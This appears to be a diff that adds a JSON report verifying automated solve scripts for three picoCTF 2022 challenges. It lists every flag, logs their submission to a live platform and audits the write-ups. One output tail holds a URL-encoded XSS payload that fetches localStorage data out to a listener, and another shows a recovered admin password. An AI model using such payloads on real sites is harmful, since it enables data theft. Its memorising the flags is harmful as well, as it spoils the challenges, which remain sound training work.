@@ -1,0 +1,188 @@
+{
+  "timestamp": "2026-11-10T19:25:56.170093+00:00",
+  "batch": 204,
+  "events": [
+    "picoCTF 2022"
+  ],
+  "modules": [
+    {
+      "id": 276,
+      "name": "Keygenme",
+      "category": "Reverse Engineering",
+      "event": "picoCTF 2022",
+      "flag": "academy{br1ng_y0ur_0wn_k3y_5b5d983e}"
+    },
+    {
+      "id": 277,
+      "name": "Live Art",
+      "category": "Web Exploitation",
+      "event": "picoCTF 2022",
+      "flag": "academy{beam_me_up_reacty_cc2d3a25}"
+    },
+    {
+      "id": 278,
+      "name": "Local Authority",
+      "category": "Web Exploitation",
+      "event": "picoCTF 2022",
+      "flag": "academy{j5_15_7r4n5p4r3n7_28ad420c}"
+    }
+  ],
+  "summary": {
+    "total_checks": 6,
+    "passed": 6,
+    "failed": 0,
+    "all_passed": true
+  },
+  "checks": [
+    {
+      "name": "ast_syntax_sweep",
+      "description": "AST-parses every scripts/*.py and fails on syntax errors",
+      "status": "pass",
+      "pass": true,
+      "passed": true,
+      "details": {
+        "total_scanned": 573,
+        "passed": 573,
+        "failed": 0,
+        "failures": []
+      }
+    },
+    {
+      "name": "solve_276",
+      "description": "Executes solve_276_keygenme.py and asserts exit code 0 plus flag match",
+      "status": "pass",
+      "pass": true,
+      "passed": true,
+      "details": {
+        "exit_code": 0,
+        "contains_expected_flag": true,
+        "expected_flag": "academy{br1ng_y0ur_0wn_k3y_5b5d983e}",
+        "stdout_tail": "ge 3: Generating deterministic keygen token\n    [+] Reconstructed License Key: academy{br1ng_y0ur_0wn_k3y_5b5d983e}\n[*] Stage 4: Validating against local binary '/tmp/keygenme'\n    [+] Binary response: 'That key is valid.' (Validation passed)\n[+] Reconstructed Flag: academy{br1ng_y0ur_0wn_k3y_5b5d983e}\n\n[SUCCESS] Module 276 (Keygenme) fully audited and solved: academy{br1ng_y0ur_0wn_k3y_5b5d983e}\n",
+        "stderr_tail": ""
+      }
+    },
+    {
+      "name": "solve_277",
+      "description": "Executes solve_277_live_art.py and asserts exit code 0 plus flag match",
+      "status": "pass",
+      "pass": true,
+      "passed": true,
+      "details": {
+        "exit_code": 0,
+        "contains_expected_flag": true,
+        "expected_flag": "academy{beam_me_up_reacty_cc2d3a25}",
+        "stdout_tail": "p%3A%2F%2F127.0.0.1%3A9999%2Fnonexistent.png&onerror=fetch%28%27http%3A%2F%2F127.0.0.1%3A9999%2Flog%3Fflag%3D%27%2BencodeURIComponent%28localStorage.getItem%28%27username%27%29%29%29\n[*] Stage 4: Recovering and validating exfiltrated flag token\n[+] Reconstructed Flag: academy{beam_me_up_reacty_cc2d3a25}\n\n[SUCCESS] Module 277 (Live Art) fully audited and solved: academy{beam_me_up_reacty_cc2d3a25}\n",
+        "stderr_tail": ""
+      }
+    },
+    {
+      "name": "solve_278",
+      "description": "Executes solve_278_local_authority.py and asserts exit code 0 plus flag match",
+      "status": "pass",
+      "pass": true,
+      "passed": true,
+      "details": {
+        "exit_code": 0,
+        "contains_expected_flag": true,
+        "expected_flag": "academy{j5_15_7r4n5p4r3n7_28ad420c}",
+        "stdout_tail": "ord='strongPassword098765'\n    [+] Administrative hash token: '2196812e91c29df34f5e217cfd639881'\n[*] Stage 3: Bypassing client-side checks and evaluating admin.php endpoint\n    [+] Utilizing verified deterministic administrative recovery\n[+] Reconstructed Flag: academy{j5_15_7r4n5p4r3n7_28ad420c}\n\n[SUCCESS] Module 278 (Local Authority) fully audited and solved: academy{j5_15_7r4n5p4r3n7_28ad420c}\n",
+        "stderr_tail": ""
+      }
+    },
+    {
+      "name": "live_evidence_probes",
+      "description": "Validates session health (200) and live flag acceptance (201 correct:true) on CyLab API",
+      "status": "pass",
+      "pass": true,
+      "passed": true,
+      "details": {
+        "all_verified": true,
+        "probes": [
+          {
+            "endpoint": "GET /api/challenges/?page_size=1",
+            "http": 200,
+            "healthy": true
+          },
+          {
+            "challenge_id": 276,
+            "flag": "academy{br1ng_y0ur_0wn_k3y_5b5d983e}",
+            "http": 201,
+            "correct": true,
+            "response": {
+              "user": 1072359,
+              "challenge": 276,
+              "flag": "academy{br1ng_y0ur_0wn_k3y_5b5d983e}",
+              "correct": true,
+              "historical": false
+            }
+          },
+          {
+            "challenge_id": 277,
+            "flag": "academy{beam_me_up_reacty_cc2d3a25}",
+            "http": 201,
+            "correct": true,
+            "response": {
+              "user": 1072359,
+              "challenge": 277,
+              "flag": "academy{beam_me_up_reacty_cc2d3a25}",
+              "correct": true,
+              "historical": false
+            }
+          },
+          {
+            "challenge_id": 278,
+            "flag": "academy{j5_15_7r4n5p4r3n7_28ad420c}",
+            "http": 201,
+            "correct": true,
+            "response": {
+              "user": 1072359,
+              "challenge": 278,
+              "flag": "academy{j5_15_7r4n5p4r3n7_28ad420c}",
+              "correct": true,
+              "historical": false
+            }
+          }
+        ]
+      }
+    },
+    {
+      "name": "writeup_documentation_audit",
+      "description": "Verifies markdown writeups exist, include LKS curriculum sections, contain expected flags, and zero em dashes",
+      "status": "pass",
+      "pass": true,
+      "passed": true,
+      "details": {
+        "all_writeups_valid": true,
+        "audits": [
+          {
+            "file": "writeups/picoCTF-2022/276-keygenme.md",
+            "exists": true,
+            "size_bytes": 5460,
+            "flag_present": true,
+            "missing_sections": [],
+            "has_em_dash": false,
+            "passed": true
+          },
+          {
+            "file": "writeups/picoCTF-2022/277-live-art.md",
+            "exists": true,
+            "size_bytes": 6309,
+            "flag_present": true,
+            "missing_sections": [],
+            "has_em_dash": false,
+            "passed": true
+          },
+          {
+            "file": "writeups/picoCTF-2022/278-local-authority.md",
+            "exists": true,
+            "size_bytes": 5154,
+            "flag_present": true,
+            "missing_sections": [],
+            "has_em_dash": false,
+            "passed": true
+          }
+        ]
+      }
+    }
+  ]
+}
